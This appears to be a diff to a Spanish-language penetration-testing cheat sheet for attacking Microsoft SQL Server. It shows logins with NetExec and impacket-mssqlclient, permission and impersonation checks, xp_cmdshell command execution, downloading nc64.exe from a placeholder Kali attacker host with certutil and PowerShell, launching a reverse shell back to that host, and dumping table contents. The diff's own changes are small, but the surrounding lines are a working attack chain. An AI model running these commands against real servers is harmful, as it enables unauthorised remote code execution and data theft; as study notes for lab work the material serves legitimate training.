@@ -83,7 +83,7 @@ IMPORTANTE:
 ```bash 
 ❯ nxc mssql 127.0.0.1 -u 'user' -p 'pass' 
 ❯ nxc mssql 127.0.0.1 -u 'user' -p 'pass' --local-auth
-
+❯ nxc mssql 127.0.0.1 -u 'user' -p 'pass' --local-auth --port 1434 
 
 IMPORTANTE:
 	- [Pwn3d!] → sysadmin → xp_cmdshell directo
@@ -121,6 +121,7 @@ IMPORTANTE:
 
 ```bash 
 ❯ impacket-mssqlclient 'user:passwd'@127.0.0.1 -windows-auth      <- IMPORTANTE
+❯ impacket-mssqlclient -port 1434 'user:passwd'@127.0.0.1 
 
 ❯ impacket-mssqlclient domain01.corp/'user:passwd'@127.0.0.1 -windows-auth      <- IMPORTANTE 
 ❯ impacket-mssqlclient domain01.corp/'user:passwd'@localhost -windows-auth 
@@ -131,6 +132,13 @@ IMPORTANTE:
 ### 2b. Si ingreso a la DB y no soy SysAdmin, verificar si se puede IMPERSONAR 
 
 ```bash 
+❯ USE aboroabmain;
+❯ SELECT name FROM sys.database_principals WHERE IS_ROLEMEMBER(name, 'db_owner') = 1;
+
+❯ SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
+
+❯ SELECT name, is_trustworthy_on FROM sys.databases WHERE name = 'aboroabmain';
+
 Paso 0:
 # Impersonación → actuar como otro usuario con más privilegios
 # Muy común en entornos mal configurados → jon.snow puede ser samwel.tarlly → SA
@@ -201,6 +209,7 @@ Paso 1:
 ❯ xp_cmdshell "mkdir C:\Temp"
 ❯ xp_cmdshell "dir C:\Temp"   # Mirar el contenido del directorio 
 
++++
 
 Paso 2 → Descargar nc64.exe desde Kali
 ❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://❮IP_KALI❯/nc64.exe C:\temp\nc64.exe'
@@ -226,6 +235,7 @@ NOTA:
 
 ❯ xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(\"http://❮IP_KALI❯/nc64.exe\",\"C:\temp\nc64.exe\")"'
 
++++
 
 Paso 3 → Ejecutar reverse shell
 ❯ EXEC xp_cmdshell 'C:\temp\nc64.exe -e cmd.exe ❮IP_KALI❯ 443'
@@ -330,7 +340,7 @@ Paso 4:
 	❯ SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG='DB_Name';
 	❯ SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';   
 	
-    # Ver los datos de unaa tabla 
+    # Ver los datos de una tabla 
 	❯ SELECT * FROM tabla_nombre;
 	❯ SELECT * FROM dbo.<Table_Name>;  
 	❯ SELECT * FROM usuarios;
